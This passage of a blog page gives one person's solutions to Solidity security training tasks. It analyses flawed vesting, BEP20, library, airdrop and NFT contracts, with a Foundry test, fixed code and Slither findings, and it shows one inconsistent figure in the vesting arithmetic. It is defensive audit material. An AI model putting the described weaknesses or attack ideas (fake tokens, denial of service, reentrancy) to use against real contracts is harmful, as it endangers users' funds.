@@ -1,0 +1,363 @@
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
+         Pessimistic Tasks
+        
+    </title><meta content="Pessimistic Tasks" property=og:title><link href=/favicons/favicon.ico rel=icon type=image/png><link href=https://themj0ln1r.github.io/fonts.css rel=stylesheet><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel=stylesheet><script async data-goatcounter=https://themj0ln1r.goatcounter.com/count src=https://themj0ln1r.github.io/js/count.js></script><noscript><img src="https://themj0ln1r.goatcounter.com//count?p=/archive/pessimist-tasks/&t=Pessimistic Tasks"></noscript><script src=https://themj0ln1r.github.io/js/codeblock.js></script><script src=https://themj0ln1r.github.io/js/toc.js></script><script src=https://themj0ln1r.github.io/js/note.js></script><script>MathJax = {
+              tex: {
+                inlineMath: [['$', '$'], ['\\(', '\\)']]
+              }
+            };</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><link title="TheMj0ln1r Blog" href=https://themj0ln1r.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://themj0ln1r.github.io/theme/light.css rel=stylesheet><link href=https://themj0ln1r.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><script src=https://themj0ln1r.github.io/js/themetoggle.js></script><script>setTheme(getSavedTheme());</script><link href=https://themj0ln1r.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://themj0ln1r.github.io/><b>TheMj0ln1r Blog</b></a><div class=socials></div></div><nav><a href=https://themj0ln1r.github.io/cv style=margin-left:.5em><b>CV</b></a><a href=https://themj0ln1r.github.io/archive style=margin-left:.5em><b>Archive</b></a><a href=https://themj0ln1r.github.io/tags style=margin-left:.5em><b>Tags</b></a> |<a onclick="toggleTheme(); event.preventDefault();" href=# id=dark-mode-toggle> <img alt=Light id=sun-icon src=https://themj0ln1r.github.io/feather/sun.svg style=filter:invert()> <img alt=Dark id=moon-icon src=https://themj0ln1r.github.io/feather/moon.svg> </a><script>updateItemToggleTheme()</script></nav></header><main><article><div class=title><div class=page-header>Pessimistic Tasks</div><div class=meta>Posted on <time>2023-12-30</time><span class=tags-label> :: Tags:</span><span class=tags> <a class=post-tag href=https://themj0ln1r.github.io/tags/blockchain/>blockchain</a> </span> :: <a rel="noopener noreferrer" href=https://github.com/pessimistic-io/internship-tasksarchive/2023-12-30-pessimist-tasks.md target=_blank> Source Code</a></div></div><div class=toc-container><h5 class=toc-title>Table of Contents</h5><ul class=toc-list><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#vesting>Vesting</a> <ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#description>Description</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#vulnerabilities>Vulnerabilities</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#attack-poc>Attack POC</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#recommendation>Recommendation</a></ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#vulnerable-bep20>Vulnerable BEP20</a> <ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#description-1>Description</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#observations>Observations</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#differences-from-standard-bep20>Differences from Standard BEP20</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#recommendations>Recommendations</a></ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#libraries>Libraries</a> <ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#description-2>Description</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#observations-1>Observations</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#questions>Questions</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#vulnerabilities-1>Vulnerabilities</a></ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#airdrop>Airdrop</a> <ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#description-3>Description</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#vulnerabilities-2>Vulnerabilities</a></ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#nft>NFT</a> <ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#description-observations>Description & Observations</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#configuration>Configuration</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#slither-output-validation>Slither Output & Validation</a></ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#foundry-task>Foundry Task</a> <ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#description-4>Description</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#initial-test-results>Initial Test Results :</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#reason-of-test-fail>Reason of test fail</a></ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#delegatecall>Delegatecall</a> <ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#description-5>Description</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#questions-1>Questions</a></ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#king-of-the-ether>King of the Ether</a> <ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#description-6>Description</a></ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#vulnerable-erc20>Vulnerable ERC20</a> <ul><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#description-7>Description</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#observations-2>Observations</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#differences-from-standard-erc20>Differences from Standard ERC20</a><li><a href=https://themj0ln1r.github.io/archive/pessimist-tasks/#vulnerabilities-recommendations>Vulnerabilities & Recommendations</a></ul></ul></div><section class=body><p>Hello all, I found some cool solidity security tasks created by <a href=https://pessimistic.io/ target=_blank>Pessimistic Security</a> contributed by <a href=https://github.com/korepkorep target=_blank>@korepkorep</a> and <a href=https://github.com/PavelCore target=_blank>@PavelCore</a>. These challenges looks interesting to me, I solved all of them and you can find my solutions to them below.<p>Pessimistic Security Tasks Repo : <a href=https://github.com/pessimistic-io/internship-tasks target=_blank>Tasks</a><p>My solution Repo : <a href target=_blank>Will Push Soon</a><h1 id=vesting>Vesting</h1><h2 id=description>Description</h2><p>Vesting contract implements a Token Vesting Pattern. Token Vesting is the process in which purchased tokens are locked and released slowly over time. Particularly this Vesting contract follows the <code>cliff vesting</code>. Which means the tokens will be locked for the cliff duration and after cliff duration the tokens will be released linearly. The Vesting contracts initializes the <code>token</code>, <code>cliffMonthDuration</code>, <code>vestingMonthDuration</code>, accounts and amounts to be locked. To release tokens <code>release()</code> is called. The tokens will only be released after the cliff duration has been passed. If the cliff duration passed the <code>amountByMonth</code> is calculated and the <code>releaseAmount</code> is calculated for the total months from the star time. The released amount will be transfered to the caller of <code>release()</code> function.<h2 id=vulnerabilities>Vulnerabilities</h2><p>The main vulnerability is that the tokens sent to the Vesting contract are locked forever. This is because the incorrect calculation of the <code>amountByMonth</code>.<p><code>uint256 amountByMonth = vestingInfo.locked / (vestingDuration + cliffDuration);</code><p>Lets say, the <code>cliffMonthDuration = 2</code> and <code>vestingMonthDuration = 5</code> and tokens sent are 1000.<p><code>vestingDuration + cliffDuration = (2 * 4 weeks) + (5 * 4 weeks)</code> = 16934400<p>amountByMonth = 1000 / 1693440, This result 0 in solidity. So, our tokens wont be released unless the total tokens sent are greater than 1693440. That too, we will get very less amount for each month.<h2 id=attack-poc>Attack POC</h2><p>POC to catch the vulnerability :<pre style=color:#323232;background-color:#fff><code><span>    // Before modification
+</span><span>    function test_vesting() public{
+</span><span>        console.log("Balance of Address(1) : ", token.balanceOf(address(1)));
+</span><span>        console.log("Balance of Vesting : ", token.balanceOf(address(vest)));
+</span><span>        vm.startPrank(address(1));
+</span><span>        vm.warp(vest.startTimestamp() + 2*4 weeks + 1);
+</span><span>
+</span><span>        vm.expectRevert();
+</span><span>        vest.release();
+</span><span>
+</span><span>        vm.stopPrank();
+</span><span>        console.log("Balance of Address(1) : ", token.balanceOf(address(1)));
+</span><span>        console.log("Balance of Vesting : ", token.balanceOf(address(vest)));
+</span><span>    }
+</span></code></pre><h2 id=recommendation>Recommendation</h2><p>To fix the bug, we need to calculate the amountByMonth by dividing the <code>(vestingDuration + cliffDuration)</code> by <code>4 weeks</code>.<p><code>uint256 amountByMonth = vestingInfo.locked / ((vestingDuration + cliffDuration) / 4 weeks );</code><p>What this does is, it ensures to calculate the amout for one month, instead of calculating for the huge number of seconds.<p>Corrected Code :<pre class=language-diff data-lang=diff style=color:#323232;background-color:#fff><code class=language-diff data-lang=diff><span>// This code snippet is provided by Pessimistic company.
+</span><span>// To apply for the internship opportunity at Pessimistic company,
+</span><span>// please fill out the form by visiting the following link: https://forms.gle/SUTcGi8X86yNoFnG7
+</span><span>
+</span><span>// Caution: This code is intended for educational purposes only
+</span><span>// and should not be used in production environments.
+</span><span>
+</span><span>// SPDX-License-Identifier: UNLICENSED
+</span><span>pragma solidity ^0.8.14;
+</span><span>
+</span><span>import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+</span><span>
+</span><span>contract Vesting {
+</span><span>    event TokenReleased(
+</span><span>        address indexed account,
+</span><span>        address indexed token,
+</span><span>        uint256 amount
+</span><span>    );
+</span><span>
+</span><span>    struct Info {
+</span><span>        uint256 locked;
+</span><span>        uint256 released;
+</span><span>    }
+</span><span>
+</span><span>    address public immutable token;
+</span><span>    uint256 public immutable startTimestamp;
+</span><span>    uint256 internal cliffDuration;
+</span><span>    uint256 internal vestingDuration;
+</span><span>
+</span><span>    mapping(address => Info) internal _vesting;
+</span><span>
+</span><span>    /**
+</span><span>     * @notice constructor
+</span><span>     * @param token_ - token address
+</span><span>     * @param cliffMonthDuration - cliff duration in months
+</span><span>     * @param vestingMonthDuration - vesting duration in months
+</span><span>     * @param accounts - vesting accounts
+</span><span>     * @param amounts - vesting amounts of accounts
+</span><span>     **/
+</span><span>    constructor(
+</span><span>        address token_,
+</span><span>        uint256 cliffMonthDuration,
+</span><span>        uint256 vestingMonthDuration,
+</span><span>        address[] memory accounts,
+</span><span>        uint256[] memory amounts
+</span><span>    ) {
+</span><span>        startTimestamp = uint64(block.timestamp);
+</span><span>
+</span><span>        token = token_;
+</span><span>        cliffDuration = cliffMonthDuration * 4 weeks;
+</span><span>        vestingDuration = vestingMonthDuration * 4 weeks;
+</span><span>
+</span><span>        for (uint256 i = 0; i &lt; accounts.length; i++) {
+</span><span>            _vesting[accounts[i]] = Info({locked: amounts[i], released: 0});
+</span><span>        }
+</span><span>    }
+</span><span>
+</span><span>    function release() external {
+</span><span>        //add history by block
+</span><span>        address sender = msg.sender;
+</span><span>
+</span><span>        require(
+</span><span>            block.timestamp > startTimestamp + cliffDuration,
+</span><span>            "cliff period has not ended yet."
+</span><span>        );
+</span><span>
+</span><span>        Info storage vestingInfo = _vesting[sender];
+</span><span style=color:#323232;background-color:#ffecec>-       uint256 amountByMonth = vestingInfo.locked / (vestingDuration + cliffDuration);
+</span><span>
+</span><span style=color:#55a532;background-color:#eaffea;font-weight:700>+</span><span style=color:#323232;background-color:#eaffea>       uint256 amountByMonth = vestingInfo.locked / ((vestingDuration + cliffDuration)/ 4 weeks);
+</span><span>
+</span><span>        uint256 releaseAmount = ((block.timestamp - startTimestamp) / 4 weeks) *
+</span><span>            amountByMonth -
+</span><span>            vestingInfo.released;
+</span><span>
+</span><span>        require(releaseAmount > 0, "not enough release amount.");
+</span><span>
+</span><span>        vestingInfo.released += releaseAmount;
+</span><span>        SafeERC20.safeTransfer(IERC20(token), sender, releaseAmount);
+</span><span>    }
+</span><span>}
+</span></code></pre><p>POC To ensure secure code :<pre style=color:#323232;background-color:#fff><code><span>    // After fixing bug
+</span><span>    function test_vestingFixed() public{
+</span><span>        console.log("Balance of Address(1) : ", token.balanceOf(address(1)));
+</span><span>        console.log("Balance of Vesting : ", token.balanceOf(address(vest)));
+</span><span>        vm.startPrank(address(1));
+</span><span>        vm.warp(vest.startTimestamp() + 2*4 weeks + 1);
+</span><span>
+</span><span>        vest.release();
+</span><span>
+</span><span>        vm.stopPrank();
+</span><span>        console.log("Balance of Address(1) : ", token.balanceOf(address(1)));
+</span><span>        console.log("Balance of Vesting : ", token.balanceOf(address(vest)));
+</span><span>    }
+</span></code></pre><h1 id=vulnerable-bep20>Vulnerable BEP20</h1><h2 id=description-1>Description</h2><p>BEP20 basically refers to a token standard used for creating tokens on Binance Smart Chain, just like ERC20 for creating tokens on Ethereum. BEP20 have many similarities with the ERC20 token standard. To interact with the BSC blockchain, a token based on the BEP-20 standard, BNB, is required to pay for transactions, just like Ether is used to pay for gas fees in the Ethereum blockchain. In fact, the BEP-20 standard is an extension of the ERC–20 standard on Ethereum.<h2 id=observations>Observations</h2><p>BEP20.sol file consists of a <code>IBEP20</code> interface, <code>Context</code> contract, <code>SafeMath</code> library, <code>Ownable</code> contract, <code>BEP20Token</code> contract. <code>BEP20Token</code> contract inherits the all the contracts and interface.<ul><li>It has two mappings <code>_balances</code> and <code>_allowances</code> similar to ERC20<li>BEP20 token has the <code>name</code>, <code>symbol</code>, <code>totalSupply</code>, <code>decimals</code>.<li>The totalSupply is <code>1000000000000000 * 1e18</code> will be minted to the contract deployer.<li><code>balanceOf()</code> and <code>allowance()</code> returns the balances, allowances respectively.<li>It has <code>approve()</code> and <code>transferFrom()</code> functions similar to ERC20.<li><code>increaseAllowances()</code> and <code>decreaseAllowances()</code> were used to change the allowances securely.<li><code>mint()</code> and <code>burn()</code> functions were implemented.<li><code>burnFrom()</code> function is appeared which is not in ERC20<li>In <code>Ownable</code> contract CEI are not followed. Events were emitted before effects.</ul><h2 id=differences-from-standard-bep20>Differences from Standard BEP20</h2><ol><li><code>Transfer</code> event was not emitted inside the constructor, were the deployer gets the totalSupply amount of tokens.<li>No <code>getOwner()</code> function is implemented. Which is necessary as per the standard.<li>Burning a token emits an event <code>Burn()</code>. Which is not the standard event.<li>After burning a token, the <code>_burn()</code> should emit an event <code>Transfer(account, address(0), amount);</code><li><code>burnFrom()</code> function is defined. Which not necessary and not mentioned in standard.</ol><h2 id=recommendations>Recommendations</h2><ol><li>Implement <code>getOwner()</code> function which is necessary as per standard.<li>Remove <code>Burn</code> event, replace this with <code>Transfer</code> event.<li>Use <code>mint()</code> function instead of direct update of balance of owner inside constructor.<li>Use <code>increaseAllowances()</code> and <code>decreaseAllowances()</code> to change allowances instead of <code>approve()</code>.</ol><h1 id=libraries>Libraries</h1><h2 id=description-2>Description</h2><p>A library in Solidity is a different type of smart contract that contains reusable code. Once deployed on the blockchain (only once), it is assigned a specific address and its properties / methods can be reused many times by other contracts in the Ethereum network.<h2 id=observations-1>Observations</h2><ul><li>The CountersUpgradeable and EnumerableSetUpgradeable are removed by the OpenZeppelin, they are no more accessible.<li>We can use a storage variable as counter instead of CountersUpgradeable contract, because the arithmetic checks were done by the solidity compiler 0.8.x<li>I have manually added these two contracts to keep the challenge as it is.<li>The <code>Libraries.sol</code> consists of two library contracts <code>Items</code> and <code>Placements</code>.<li>The <code>Items</code> library have two structs <code>ItemId</code> and <code>Item</code>. The <code>Items</code> library functions can be called on <code>ItemId</code> struct. (using Items for ItemId).<li><code>Placement</code> library have two structs <code>Placements</code> and <code>Registry</code><li>CountersUpgradeable functions can be called on <code>CountersUpgradeable.Counter</code> and Items functions can be calleable on <code>Items.Item</code><li>An abstract contract <code>ManageStorage</code> also defined.</ul><h2 id=questions>Questions</h2><ol><li><p>How is the _placementRegistry from the ManagerStorage contract initialized? (Write a mini-contract with 3 variants of initialization. For instance, you can design it as 3 functions).</p> <ul><li><code>_placementRegistry</code> is an instance of struct <code>Placements.Registry</code>. That is the <code>Registry</code> struct inside <code>Placements</code> library.<li><code>placementRegisrty</code> is not initialized inside ManagerStorage.<li>Structs with nested mappings can't be directly constructed. i.e, we cannot use <code>Placements.Registry({})</code> initialization method.<li>This is because since version 0.7.0, structs or arrays that contain a mapping can only be used in storage, so Solidity complains because variables in an instantiation function would be in memory by default.</ul> <pre style=color:#323232;background-color:#fff><code><span>contract Manager is ManagerStorage{
+</span><span>    constructor(){
+</span><span>        _placementRegistry.placementIdTracker = CountersUpgradeable.Counter(0);
+</span><span>    }
+</span><span>    function initialize() public {
+</span><span>        _placementRegistry.placementIdTracker = CountersUpgradeable.Counter(0);
+</span><span>    }
+</span><span>
+</span><span>    function initializeX(Placements.Placement memory placement) public {
+</span><span>        _placementRegistry.placementIdTracker = CountersUpgradeable.Counter(0);
+</span><span>        uint placementId = Placements.register(_placementRegistry, placement);
+</span><span>    }
+</span><span>}
+</span></code></pre><li><p>Are the items at line 73 in the Placements contract added correctly? Why? (Give a detailed explanation).</p> <ul><li>The items were added to <code>placementRecord</code> items correctly. But the <code>placementId</code> in line 66 is not defined. This should the the current counter value after increment on Counter.</ul> <pre class=language-diff data-lang=diff style=color:#323232;background-color:#fff><code class=language-diff data-lang=diff><span>    function register(Registry storage self, Placement memory placement) external returns (uint256 placementId) {
+</span><span>        self.placementIdTracker.increment();
+</span><span style=color:#55a532;background-color:#eaffea;font-weight:700>+</span><span style=color:#323232;background-color:#eaffea>       placementId = self.placementIdTracker.current();
+</span><span>        Placement storage placementRecord = self.placements[placementId];
+</span><span>
+</span><span>        placementRecord.sender = placement.sender;
+</span><span>        placementRecord.beneficiary = placement.beneficiary;
+</span><span>        placementRecord.deadline = placement.deadline;
+</span><span>
+</span><span>        for (uint256 i = 0; i &lt; placement.items.length; i++) {
+</span><span>            placementRecord.items.push(placement.items[i]);
+</span><span>            placement.items[i].deposit(placement.fee);
+</span><span>        }
+</span><span>    }
+</span></code></pre> <ul><li>The <code>placementRecord</code> is the <code>Placement</code> struct. i.e, <code>self.placements[placementId]</code> is points to the mapping inside <code>Registry</code> struct which gets the <code>Placement</code> struct from placementId.<li><code>placementRecord</code> was updated with sender, beneficiary and deadline.<li>Then for loop fetches each Item struct from the array of Item structs. They will be pushed to the <code>placementRecord.items</code> which is an array of Item structs.<li>Then <code>deposit()</code> is called on the <code>placement.items[i]</code> which is a Item struct. We can see <code>using Items for Items.Item;</code> this enable <code>deposit()</code> to be called on the Item struct.</ul><li><p>What is the purpose of using Items for ItemtId in Items library? (Give an extended explanation and specify the line in the code).</p> <ul><li>By <code>using Items for ItemId</code>, the ItemId struct gains access to functions defined within the Items library. This extends the functionality of the ItemId struct without directly modifying its definition.<li>By extending <code>ItemId</code> with the Items library, functions like token and hash become directly accessible to instances of ItemId.<li>In line 40 <code>address itemToken = item.id.token();</code> is used to fetch the <code>itemToken</code>.<li>The <code>token()</code> function is available to call on <code>item.id</code> which is nothing but the <code>ItemId</code> instance.</ul><li><p>How is the placement fee deducted? Who is it paid from and to whom? How are msg.sender and address(this) changed with each external call? (Give a detailed explanation)</p> <ul><li>The registration can be done by using this contract,</ul> <pre style=color:#323232;background-color:#fff><code><span>contract Manager is ManagerStorage{
+</span><span>    function registerPlacement(Placements.Placement memory placement) public returns (uint256 placementId) {
+</span><span>        placementId = Placements.register(_placementRegistry, placement);
+</span><span>    }
+</span><span>}
+</span></code></pre> <ul><li>Manager contract will takes the Placement struct and calls the <code>register()</code> function of librar <code>Placements</code>.<li>The first paramenter is the <code>Registry</code> struct and the second one is <code>Placements</code> struct.<li>The <code>fee</code> amount of <code>token</code> will be paid from <code>msg.sender</code> to the <code>Manager</code> contract.<li>The <code>msg.sender</code> will always the caller of the <code>registerPlacement()</code> function. And the <code>this</code> will be the address of <code>Manager()</code> contract.<li>This is because when calling public or external functions of libraries, <code>DELEGATECALL</code> will be made to the library.<li>What delegatecall does is, it maintains the context of call. That is the <code>msg.sender</code>. So, everytime the <code>register()</code> function of Placement library is called, the <code>msg.sender</code> will be the actual caller of the <code>registerPlacement()</code> function.</ul></ol><h2 id=vulnerabilities-1>Vulnerabilities</h2><ul><li>The system id vulnerable, in such a that it can accept any tokens, An attacker could deploy a fake token and can register the placement.<li>Attacker could even DOS the protocol by passing huge number of items array.</ul><h1 id=airdrop>Airdrop</h1><h2 id=description-3>Description</h2><p>The Airdrop contract implements a Merkle tree for ERC20 pull-based airdrops. Merkle trees used in airdrops , since Merkle proofs allow us to very efficiently implement ERC20 token airdrops. The implementation simple using Openzeppelin MerkleProof library. The <code>Airdrop</code> contract imports <code>MerkleProof</code> and <code>SafeERC20</code> contracts. It stores <code>token</code> address and merkleroot. And implements a <code>claim()</code> function for users to pass their merkleproof and amount to claim their tokens.<h2 id=vulnerabilities-2>Vulnerabilities</h2><ul><li><p>First of all, the initial check <code>require(_erc20.balanceOf(msg.sender) == 0);</code> stops users claiming their tokens even if they haven't claimed it before.</p><li><p>An attacker can claim his tokens initially and sends at least <code>1</code> token to the other user, in this case the user cannot claim their tokens.</p><li><p>So, this is not an efficient check to find the user already claimed the tokens or not.</p><li><p>Instead we can keep a mapping to check the claim status of the users.</p><li><p>And the verification process also incorrectly finding the node.</p><li><p><code>keccak256(abi.encode(msg.sender))</code> is the node being verified. But this is not the correct way to check, it should include the <code>amount</code>.</p><li><p>Also, as per OpenZeppelin docs it is suggested to use the following line to extract the leaf node.</p> <p><code>bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(addr, amount))));</code></p><li><p>And check the balance of the Airdrop contract.</p><li><p>Fixed code :</p> <pre style=color:#323232;background-color:#fff><code><span>// SPDX-License-Identifier: UNLICENSED
+</span><span>pragma solidity ^0.8.9;
+</span><span>
+</span><span>import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
+</span><span>import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+</span><span>import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
+</span><span>
+</span><span>contract Airdrop {
+</span><span>    using MerkleProof for bytes32[];
+</span><span>    using SafeERC20 for IERC20;
+</span><span>
+</span><span>    bytes32 private _merkleTreeRoot;
+</span><span>
+</span><span>    IERC20 private _erc20;
+</span><span>
+</span><span>    mapping (address => bool) private isClaimed;
+</span><span>
+</span><span>    event Claim(address indexed who, uint256 amount);
+</span><span>
+</span><span>    constructor(IERC20 erc20, bytes32 merkleTreeRoot) {
+</span><span>        _erc20 = erc20;
+</span><span>        _merkleTreeRoot = merkleTreeRoot;
+</span><span>    }
+</span><span>
+</span><span>    function claim(uint256 amount, bytes32[] calldata proof) external {
+</span><span>        require(!isClaimed[msg.sender], "Already claimed");
+</span><span>        require(amount &lt;= _erc20.balanceOf(address(this)), "Out of tokens" );
+</span><span>
+</span><span>        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(msg.sender, amount))));
+</span><span>        //bytes32 leaf = keccak256(abi.encode(msg.sender, amount)); // this will also works
+</span><span>
+</span><span>        require(proof.verify(_merkleTreeRoot, leaf), "User was not found");
+</span><span>
+</span><span>        isClaimed[msg.sender] = true;
+</span><span>        _erc20.safeTransfer(msg.sender, amount);
+</span><span>
+</span><span>        emit Claim(msg.sender, amount);
+</span><span>    }
+</span><span>}
+</span></code></pre></ul><h1 id=nft>NFT</h1><h2 id=description-observations>Description & Observations</h2><p>First of all the NFT.sol uses the compiler version <code>^0.8.2</code>. It imported many external openzeppelin library contracts. The <code>IERC2981Royalties</code>, <code>IRoyaltiesProvider</code>, <code>RoyaltiesV2</code> interfaces, <code>ERC2981Base</code>, <code>AbstractRoyalties</code> abstract contracts, <code>LibPart</code>, <code>LibRoyaltiesV2</code>, libraries and <code>NFT</code> contract were defined. It uses role based access control on functions. At an high level the NFT contracts implements an ERC721 token standard.<h2 id=configuration>Configuration</h2><ul><li><p>To install dependencies of NFT.sol run following command.</p> <p><code>npm i @openzeppelin/contracts@4.9.0-rc.0 --save-dev</code></p><li><p>Install <code>solc-select</code> and <code>0.8.2</code> solc version</p> <p><code>pip3 install solc-select</code></p> <p><code>solc-select install 0.8.2</code></p> <p><code>solc-select use 0.8.2</code></p><li><p>Run slither</p> <p><code>slither . --solc-disable-warnings --exclude-informational</code></p></ul><h2 id=slither-output-validation>Slither Output & Validation</h2><ol><li><p><strong>[HIGH] Nft.withdraw() (src/NFT/NFT.sol#328-332) sends eth to arbitrary user.</strong></p> <ul><li><p>The vulnerability is because of unprotected call to a function sending Ether to an arbitrary address.</p> <pre style=color:#323232;background-color:#fff><code><span>/// @dev owner can withdraw Ether sent to the contract
+</span><span>function withdraw() public onlyRole(CEO) {
+</span><span>    uint256 balance = address(this).balance;
+</span><span>    require(balance != 0);
+</span><span>    payable(msg.sender).transfer(balance);
+</span><span>}
+</span></code></pre><li><p>The <code>withdraw()</code> function should send the contract balance to the <code>owner</code>. Here, the balance was sent to the <code>msg.sender</code>.</p><li><p>Only callers who have the <code>CEO</code> role can call the <code>withdraw()</code> function.</p><li><p>The <code>CEO</code> role was assigned to the contract deployer. The actual owner is also the contract deployer.</p><li><p>So, <code>msg.sender</code> will be the <code>owner</code> or <code>CEO</code>.</p><li><p>If any unwanted bypass has been done to the <code>onlyRole(CEO)</code>, the funds will be lost.</p><li><p>Its recommended to send the balance to the <code>owner</code> instead of <code>msg.sender</code>.</p> <pre class=language-diff data-lang=diff style=color:#323232;background-color:#fff><code class=language-diff data-lang=diff><span>/// @dev owner can withdraw Ether sent to the contract
+</span><span>function withdraw() public onlyRole(CEO) {
+</span><span>    uint256 balance = address(this).balance;
+</span><span>    require(balance != 0);
+</span><span style=color:#323232;background-color:#ffecec>-    payable(msg.sender).transfer(balance);
+</span><span style=color:#55a532;background-color:#eaffea;font-weight:700>+</span><span style=color:#323232;background-color:#eaffea>    payable(owner).transfer(balance);
+</span><span>
+</span><span>}
+</span></code></pre></ul><li><p><strong>[HIGH] Nft.tokenURI(uint256) (src/NFT/NFT.sol#235-243) calls abi.encodePacked() with multiple dynamic arguments.</strong></p> <ul><li><p>The vulnerability is a collision due to dynamic type usages in abi.encodePacked</p><li><p>As the solidity docs describe, two or more dynamic types are passed to abi.encodePacked. Moreover, these dynamic values are user-specified function arguments in external functions, meaning anyone can directly specify the value of these arguments when calling the function.</p> <pre style=color:#323232;background-color:#fff><code><span>function tokenURI(uint256 _tokenId)
+</span><span>    public
+</span><span>    view
+</span><span>    override(ERC721, ERC721URIStorage)
+</span><span>    returns (string memory)
+</span><span>{
+</span><span>    string memory _str = Strings.toString(_tokenId);
+</span><span>    return string(abi.encodePacked(baseUri, _str, suffix));
+</span><span>}
+</span></code></pre><li><p>Here the vulnerability has no effect, because the abi.encodePacked is not dealing with user specifed dynamic inputs.</p><li><p>But, it missing a minor check of the <code>baseUri</code> length.</p> <p><code>return baseUri.length > 0 ? string(abi.encodePacked(baseUri, _str, suffix)): "" ;</code></p><li><p>The usage of the <code>abi.encodePacked</code> becomes vulnerable in the case of hash verification.</p><li><p>If you use <code>keccak256(abi.encodePacked(a, b))</code> and both a and b are dynamic types, it is easy to craft collisions in the hash value by moving parts of <code>a</code> into <code>b</code> and vice-versa.</p><li><p>More specifically, <code>abi.encodePacked("a", "bc") == abi.encodePacked("ab", "c")</code>.</p></ul><li><p><strong>[MEDIUM] Reentrancy in Nft.summon(address,uint256) (src/NFT/NFT.sol#189-220)</strong></p> <ul><li><p>Slither found this as vulnerability because the state variable updates were done after the external calls.</p><li><p>The external calls was done on a token functions, they are not the low level <code>call</code>'s.</p><li><p>There is no high severity in this vulnerability because, the <code>transferFrom</code> function doesnt invoke any fallback of the caller.</p><li><p>However attacker could write a malicious ERC-20 with custom transferFrom() or approve() that have re-entrancy hooks to attack a target.</p><li><p>To do this, attacker has to update the <code>utilityToken</code> or <code>governanceToken</code> address. This can only done by the users with role <code>CLEVEL</code></p><li><p>To mitigate these possible attacks we can follow the CEI pattern.</p> <pre style=color:#323232;background-color:#fff><code><span>    function summon(address _to, uint256 _tokenId) external whenNotPaused payable {
+</span><span>
+</span><span>        require(summoningEnabled, 'Summoning is currently disabled');
+</span><span>        require(_exists(_tokenId), 'Token does not exist');
+</span><span>        require(ownerOf(_tokenId) == msg.sender, 'Sender is not the token owner');
+</span><span>        require(items[_tokenId].lastSummoned + summoningLock &lt; block.timestamp, 'Need to wait to summon');
+</span><span>        require(items[_tokenId].summonCount &lt; maxSummoningCount, 'Exceeded Summoning Count');
+</span><span>        
+</span><span>        uint256 utilitySummoningFee = summoningCosts[utilityToken][items[_tokenId].summonCount];
+</span><span>        uint256 governanceSummoningFee = summoningCosts[governanceToken][items[_tokenId].summonCount];
+</span><span>
+</span><span>        // Push a summoned token to the items array
+</span><span>        items.push(Item(block.timestamp, 0, 0, _tokenId, true));
+</span><span>        items[_tokenId].summonCount++;
+</span><span>        items[_tokenId].lastSummoned = block.timestamp;
+</span><span>
+</span><span>        if(utilitySummoningFee > 0) {
+</span><span>            require(ERC20(address(utilityToken)).transferFrom(msg.sender, address(this), utilitySummoningFee), "Transfer failed");    
+</span><span>        }
+</span><span>
+</span><span>        if(governanceSummoningFee > 0) {
+</span><span>            require(ERC20(address(governanceToken)).transferFrom(msg.sender, address(this), governanceSummoningFee), "Transfer failed");
+</span><span>        }
+</span><span>
+</span><span>        // Mint the new summoned token        
+</span><span>        uint256 tokenId = _tokenIdCounter.current();
+</span><span>        _tokenIdCounter.increment();
+</span><span>        _safeMint(_to, tokenId);
+</span><span>        
+</span><span>        emit Summoned(msg.sender, _to, tokenId);
+</span><span>    }
